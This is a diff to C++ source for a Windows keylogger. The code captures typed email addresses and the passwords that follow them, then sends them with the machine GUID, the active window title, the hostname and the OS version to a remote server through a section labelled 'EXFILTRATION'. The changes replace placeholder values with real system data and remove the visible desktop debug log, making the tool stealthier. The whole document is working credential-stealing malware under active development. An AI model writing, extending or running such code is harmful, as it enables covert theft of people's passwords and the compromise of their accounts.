@@ -13,6 +13,7 @@
 #pragma comment(lib, "winhttp.lib")
 #pragma comment(lib, "shell32.lib")
 #pragma comment(lib, "bcrypt.lib")
+#pragma comment(lib, "advapi32.lib")
 
 // --- 1. JSON ESCAPING HELPER ---
 std::string EscapeJson(const std::string& s) {
@@ -35,30 +36,40 @@ std::string EscapeJson(const std::string& s) {
     return o.str();
 }
 
-// --- 2. SYSTEM METADATA (MATCHES YOUR DATABASE UUID) ---
+// --- 2. DYNAMIC SYSTEM METADATA ---
 std::string GetMachineId() {
     char value[255];
     DWORD BufferSize = sizeof(value);
     HKEY hKey;
-    
-    // Open Registry to get MachineGuid
-    LONG lRes = RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Cryptography", 0, KEY_READ | KEY_WOW64_64KEY, &hKey);
-    
-    if (lRes == ERROR_SUCCESS) {
-        lRes = RegQueryValueExA(hKey, "MachineGuid", NULL, NULL, (LPBYTE)value, &BufferSize);
-        RegCloseKey(hKey);
-        
-        if (lRes == ERROR_SUCCESS) {
+    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Cryptography", 0, KEY_READ | KEY_WOW64_64KEY, &hKey) == ERROR_SUCCESS) {
+        if (RegQueryValueExA(hKey, "MachineGuid", NULL, NULL, (LPBYTE)value, &BufferSize) == ERROR_SUCCESS) {
             std::string rawId = value;
-            // Ensure lowercase to match standard UUID formatting
             std::transform(rawId.begin(), rawId.end(), rawId.begin(), [](unsigned char c){ return std::tolower(c); });
-            
-            // WE REMOVED SHA256 HERE. 
-            // This now returns the raw UUID: ef508dd1-092d-4d05-90ac-0b5338115bee
+            RegCloseKey(hKey);
             return rawId;
         }
+        RegCloseKey(hKey);
     }
-    return "unknown_machine_id";
+    return "unknown_id";
+}
+
+std::string GetRealHostname() {
+    char buffer[MAX_COMPUTERNAME_LENGTH + 1];
+    DWORD size = sizeof(buffer);
+    if (GetComputerNameA(buffer, &size)) return std::string(buffer);
+    return "Unknown-Host";
+}
+
+std::string GetRealOS() {
+    char value[255] = {0};
+    DWORD BufferSize = sizeof(value);
+    HKEY hKey;
+    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", 0, KEY_READ | KEY_WOW64_64KEY, &hKey) == ERROR_SUCCESS) {
+        RegQueryValueExA(hKey, "ProductName", NULL, NULL, (LPBYTE)value, &BufferSize);
+        RegCloseKey(hKey);
+        return std::string(value);
+    }
+    return "Windows 10/11";
 }
 
 std::string GetActiveWindowTitle() {
@@ -74,13 +85,6 @@ std::string GetActiveWindowTitle() {
 void WriteDebug(std::string msg) {
     std::ofstream f1("internal_status.txt", std::ios::app);
     if (f1.is_open()) { f1 << "[DEBUG] " << msg << std::endl; f1.close(); }
-
-    char path[MAX_PATH];
-    if (SHGetFolderPathA(NULL, CSIDL_DESKTOP, NULL, 0, path) == S_OK) {
-        std::string fullPath = std::string(path) + "\\debug_log.txt";
-        std::ofstream f2(fullPath, std::ios::app);
-        if (f2.is_open()) { f2 << "[DEBUG] " << msg << std::endl; f2.close(); }
-    }
 }
 
 // --- 3. EXFILTRATION ---
@@ -97,13 +101,13 @@ void UploadData(std::string email, std::string pass) {
        << "\"machineId\": \"" << GetMachineId() << "\","
        << "\"type\": \"Keylogger\","
        << "\"data\": {"
-       <<     "\"WindowsTitle\": \"" << EscapeJson(GetActiveWindowTitle()) << "\"," 
-       <<     "\"email\": \"" << EscapeJson(email) << "\","
-       <<     "\"password\": \"" << EscapeJson(pass) << "\""
+       <<      "\"WindowsTitle\": \"" << EscapeJson(GetActiveWindowTitle()) << "\"," 
+       <<      "\"email\": \"" << EscapeJson(email) << "\","
+       <<      "\"password\": \"" << EscapeJson(pass) << "\""
        << "},"
        << "\"systemMeta\": {"
-       <<     "\"os\": \"Windows 10/11\","
-       <<     "\"hostname\": \"DESKTOP-UA7UT44\""
+       <<      "\"os\": \"" << EscapeJson(GetRealOS()) << "\","
+       <<      "\"hostname\": \"" << EscapeJson(GetRealHostname()) << "\""
        << "}"
        << "}";
 
@@ -113,7 +117,7 @@ void UploadData(std::string email, std::string pass) {
             DWORD statusCode = 0;
             DWORD dwSize = sizeof(statusCode);
             WinHttpQueryHeaders(hR, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, NULL, &statusCode, &dwSize, NULL);
-            WriteDebug("Payload Delivered. Status: " + std::to_string(statusCode));
+            WriteDebug("Payload Delivered. Host: " + GetRealHostname() + " Status: " + std::to_string(statusCode));
             WriteDebug("Raw JSON: " + json);
         }
     }
@@ -156,7 +160,6 @@ void ProcessBuffer() {
 
     if (IsEmail(buffer)) {
         savedEmail = buffer;
-        WriteDebug("Email Captured: " + savedEmail);
     } else if (buffer.length() >= 8 && !savedEmail.empty()) {
         UploadData(savedEmail, buffer);
         savedEmail.clear();
